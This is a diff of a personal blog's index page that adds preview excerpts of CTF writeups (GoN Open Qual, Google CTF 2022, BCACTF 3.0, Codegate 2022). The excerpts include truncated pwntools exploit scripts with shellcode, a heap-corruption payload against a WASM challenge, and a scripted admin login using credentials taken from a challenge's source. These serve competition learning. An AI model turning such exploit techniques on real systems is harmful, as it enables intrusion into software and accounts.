@@ -106,14 +106,55 @@ if (!doNotTrack) {
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2>2022 Fall GoN Open Qual CTF Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>2022 Fall Gon Open Qual CTF
+imssm99 (2nd, 11427 pts)
+A. Zero Gravity Vulnerability idx를 입력받을 때 값을 검사하지 않아 OOB가 일어나게 된다. a, r을 통해 임의의 주소에 float 형식으로 값을 더하거나 읽을 수 있다.
+cnt = 1; for ( i = 0; i &lt; cnt; &#43;&#43;i ) { printf(&#34;(r)ead / (a)dd &gt;&gt; &#34;); scanf(&#34;%2s&#34;, &amp;s); if ( (char)s == &#39;a&#39; ) { printf(&#34; idx &gt;&gt; &#34;); scanf(&#34;%d&#34;, &amp;idx); printf(&#34; value &gt;&gt; &#34;); scanf(&#34;%f&#34;, &amp;value); arr[idx] = value &#43; arr[idx]; } else if ( (char)s == &#39;r&#39; ) { printf(&#34; idx &gt;&gt; &#34;); scanf(&#34;%d&#34;, &amp;idx); printf(&#34;%....</p>
+  </div>
+  <footer class="entry-footer"><span title='2022-09-01 20:00:00 +0900 KST'>September 1, 2022</span>&nbsp;·&nbsp;imssm99</footer>
+  <a class="entry-link" aria-label="post link to 2022 Fall GoN Open Qual CTF Writeup" href="https://blog.imssm99.kr/ctf/gon_openqual_2022_fall/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>Google Capture The Flag 2022 Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Team ST4RT, 65th
+Appnote.txt import struct with open(&#34;dump.zip&#34;, &#34;rb&#34;) as f: data = f.read() u16 = lambda x: struct.unpack(&#34;&lt;H&#34;, x)[0] flag = bytearray() eocd = data[0xEEE2:].split(b&#34;PK\x05\x06&#34;) for d in eocd[1:]: offset = u16(d[12:14]) flag.append(data[offset-1]) print(flag) Segfault Labyrinth from pwn import * context.arch = &#34;amd64&#34; #p = process(&#34;./challenge&#34;) p = remote(&#34;segfault-labyrinth.2022.ctfcompetition.com&#34;, 1337) p.recvline() p.sendline(b&#34;0&#34;*8) code = &#34;&#34;&#34; mov rsp, rdi; mov rbp, rdi; add rsp, 0x400; add rbp, 0x400; mov r8, rdi; TASK: xor rbx, rbx; RUN: mov rdi, 2; mov rsi, [r8 &#43; rbx*8]; mov rdx, 0x1; mov rax, 1; syscall; cmp rax, 0xfffffffffffffff2; jne FOUND; inc rbx; cmp rbx, 0x10; jne RUN; FOUND: mov rax, [rsi]; mov r8, rsi; cmp al, 0; je TASK; mov rdx, 0x40; mov rdi, 1; mov rax, 1; syscall; &#34;&#34;&#34; payload = b&#34;&#34; payload &#43;= asm(code) p....</p>
+  </div>
+  <footer class="entry-footer"><span title='2022-08-01 20:10:00 +0900 KST'>August 1, 2022</span>&nbsp;·&nbsp;imssm99</footer>
+  <a class="entry-link" aria-label="post link to Google Capture The Flag 2022 Writeup" href="https://blog.imssm99.kr/ctf/google_ctf_2022/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>BCACTF 3.0 Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Team ST4RT, 5th
+Notetaker WASM from pwn import * def run(i): p = remote(&#34;bin.bcactf.com&#34;, 49180) #p = process([&#34;node&#34;, &#34;--experimental-wasi-unstable-preview1&#34;, &#34;runner.js&#34;]) def note_print(idx): p.sendlineafter(b&#34;4)\n&#34;, b&#34;1&#34;) p.sendlineafter(b&#34;inclusive)\n&#34;, str(idx).encode()) def note_delete(idx): p.sendlineafter(b&#34;4)\n&#34;, b&#34;2&#34;) p.sendlineafter(b&#34;inclusive)\n&#34;, str(idx).encode()) def note_create(idx): p.sendlineafter(b&#34;4)\n&#34;, b&#34;3&#34;) p.sendlineafter(b&#34;inclusive)\n&#34;, str(idx).encode()) def note_write(idx, data): p.sendlineafter(b&#34;4)\n&#34;, b&#34;4&#34;) p.sendlineafter(b&#34;inclusive)\n&#34;, str(idx).encode()) p.sendlineafter(b&#34;\n&#34;, data) note_create(1) note_create(2) note_create(3) note_delete(1) # 0x442: %15d -&gt; %lld note_write(1, p32(0x443-0xc) &#43; p32(0x646c6c)) note_delete(2) note_delete(1) calc = lambda fd, bk: ((fd-0x8) &lt;&lt; 32) | bk note_write(1, str(calc(0xc00 &#43; 0x4*6, 0x400&#43;0xc*i))....</p>
+  </div>
+  <footer class="entry-footer"><span title='2022-06-10 20:24:11 +0900 KST'>June 10, 2022</span>&nbsp;·&nbsp;imssm99</footer>
+  <a class="entry-link" aria-label="post link to BCACTF 3.0 Writeup" href="https://blog.imssm99.kr/ctf/bcactf_3_0/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2>Codegate2022 Qual Writeup
     </h2>
   </header>
   <div class="entry-content">
     <p>University Division, imssm99, 3rd (4249 points)
- CAFE bot.py에 admin의 ID/PW가 있어 admin으로 로그인하면 flag를 볼 수 있다.
-driver.get(&#39;http://3.39.55.38:1929/login&#39;) driver.find_element_by_id(&#39;id&#39;).send_keys(&#39;admin&#39;) driver.find_element_by_id(&#39;pw&#39;).send_keys(&#39;$MiLEYEN4&#39;) driver.find_element_by_id(&#39;submit&#39;).click() time.sleep(2)  superbee func (this *AdminController) AuthKey() { 	encrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key)) 	this.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key)) } ... auth_crypt_key, _ = web.AppConfig.String(&#34;auth_crypt_key&#34;) auth_crypt_key가 설정되어있지 않아 빈 문자열이다.
-... } else if controllerName == &#34;AdminController&#34; {  domain := this.Ctx.Input.Domain()   if domain != &#34;localhost&#34; {  this....</p>
+CAFE bot.py에 admin의 ID/PW가 있어 admin으로 로그인하면 flag를 볼 수 있다.
+driver.get(&#39;http://3.39.55.38:1929/login&#39;) driver.find_element_by_id(&#39;id&#39;).send_keys(&#39;admin&#39;) driver.find_element_by_id(&#39;pw&#39;).send_keys(&#39;$MiLEYEN4&#39;) driver.find_element_by_id(&#39;submit&#39;).click() time.sleep(2) superbee func (this *AdminController) AuthKey() { encrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key)) this.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key)) } ... auth_crypt_key, _ = web.AppConfig.String(&#34;auth_crypt_key&#34;) auth_crypt_key가 설정되어있지 않아 빈 문자열이다.
+... } else if controllerName == &#34;AdminController&#34; { domain := this.Ctx.Input.Domain() if domain != &#34;localhost&#34; { this.Abort(&#34;Not Local&#34;) return } } ... func (this *AdminController) AuthKey() { encrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key)) this....</p>
   </div>
   <footer class="entry-footer"><span title='2022-03-28 14:22:00 +0900 KST'>March 28, 2022</span>&nbsp;·&nbsp;imssm99</footer>
   <a class="entry-link" aria-label="post link to Codegate2022 Qual Writeup" href="https://blog.imssm99.kr/ctf/codegate2022_qual/"></a>
